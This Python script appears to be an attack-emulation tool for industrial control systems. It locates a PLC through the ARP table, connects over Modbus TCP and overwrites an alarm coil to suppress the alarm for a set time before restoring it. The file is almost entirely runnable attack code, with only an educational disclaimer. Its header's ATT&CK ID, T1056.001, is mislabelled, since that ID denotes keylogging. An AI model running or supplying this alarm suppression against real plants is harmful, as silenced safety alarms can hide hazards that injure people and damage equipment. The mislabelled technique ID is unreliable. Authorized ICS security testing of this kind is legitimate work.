# MITRE ATT&CK T1056.001: Inhibit Response Function - Alarm Suppression
# Simulates suppressing an alarm bit in a PLC flag using Modbus TCP.
# This script targets a Modbus flag, assuming alarm status is stored in a specific PLC register/coil.
# PLEASE READ ALL COMMENTS CAREFULLY BEFORE RUNNING THIS SCRIPT.
# THIS SCRIPT IS FOR EDUCATIONAL AND TESTING PURPOSES ONLY. DO NOT USE IN A PRODUCTION ENVIRONMENT WITHOUT EXPLICIT AUTHORIZATION.
# Misuse can cause significant damage to your control system.

import pymodbus.client as ModbusClient
from pymodbus.payload import BinaryPayloadBuilder, Endian
import socket
import struct
import time

# Configuration - MODIFY THESE VALUES TO MATCH YOUR PLC AND NETWORK SETUP
PLC_IP = None # Initialize to None, will be determined dynamically if possible
MODBUS_PORT = 502  # Standard Modbus TCP port
ALARM_FLAG_ADDRESS = 1000 # Example: Coil/Register address where the alarm status resides.  Change to your specific PLC register.
SUPPRESSION_DURATION = 60 # Seconds to suppress the alarm (adjust as needed).
PLC_MAC_ADDRESS_PREFIX = "00:00:00" # Example, adjust based on your environment.

# Function to find the PLC IP address by scanning ARP table
def find_plc_ip_by_mac_prefix(mac_prefix):
    """
    Finds the IP address of a PLC given its MAC address prefix.

    This function uses the `arp` command to get the ARP table and parses it
    to find the IP address associated with the given MAC address prefix.
    """
    import subprocess

    try:
        arp_output = subprocess.check_output(['arp', '-a']).decode('utf-8')
        for line in arp_output.splitlines():
            if mac_prefix in line.lower():
                parts = line.split()
                if len(parts) > 1: # changed from >3
                    ip_address = parts[1].strip("()") # Adjust index if arp -a output format differs
                    print(f"Found PLC IP Address: {ip_address}")
                    return ip_address
        return None  # PLC not found
    except FileNotFoundError:
        print("Error: 'arp' command not found.  This usually indicates the script is running on Windows.  Please provide the PLC IP address manually or run on a Linux system.")
        return None
    except subprocess.CalledProcessError as e:
        print(f"Error running 'arp' command: {e}")
        return None

def suppress_alarm(client, address, duration):
    """
    Suppresses an alarm by writing a 'False' (0) value to the specified Modbus address.

    Args:
        client: PyModbus client object.
        address: Modbus address of the alarm flag.
        duration:  Duration in seconds to suppress the alarm for.
    """
    try:
        # Read the current value of the alarm flag for restore.
        read_result = client.read_coils(address, 1)  # Assuming it's a coil, otherwise read_holding_registers
        if read_result.isError():
             print(f"Error reading coil {address}: {read_result}")
             return False  # Failed to read
        original_alarm_state = read_result.bits[0]
        print(f"Original alarm state at address {address}: {original_alarm_state}")


        # Suppress the alarm (write False/0). Change to appropriate value
        write_result = client.write_coil(address, False) #Change this to coil or holding register depending on implementation in the PLC
        if write_result.isError():
             print(f"Error writing to coil {address}: {write_result}")
             return False  # Failed to write

        print(f"Successfully suppressed alarm at address {address} for {duration} seconds.")
        time.sleep(duration)

        # Restore the original alarm state
        restore_result = client.write_coil(address, original_alarm_state)
        if restore_result.isError():
            print(f"Error restoring coil {address}: {restore_result}")
        else:
            print(f"Successfully restored alarm state to {original_alarm_state} at address {address}.")
            return True

    except Exception as e:
        print(f"An error occurred during alarm suppression: {e}")
        return False

def main():

    global PLC_IP

    # Dynamically find the PLC IP address if it's not already defined
    if PLC_IP is None:
        PLC_IP = find_plc_ip_by_mac_prefix(PLC_MAC_ADDRESS_PREFIX)
        if PLC_IP is None:
            print("PLC IP address could not be determined automatically.  Please set it manually in the script.")
            return # Exit if we can't find the IP.

    # Create a Modbus TCP client
    client = ModbusClient.ModbusTcpClient(PLC_IP, port=MODBUS_PORT)

    try:
        # Connect to the PLC
        if client.connect():
            print(f"Successfully connected to PLC at {PLC_IP}:{MODBUS_PORT}")
            # Suppress the alarm
            suppress_alarm(client, ALARM_FLAG_ADDRESS, SUPPRESSION_DURATION)

        else:
            print(f"Failed to connect to PLC at {PLC_IP}:{MODBUS_PORT}")

    finally:
        # Close the connection
        client.close()
        print("Connection closed.")

if __name__ == "__main__":
    main()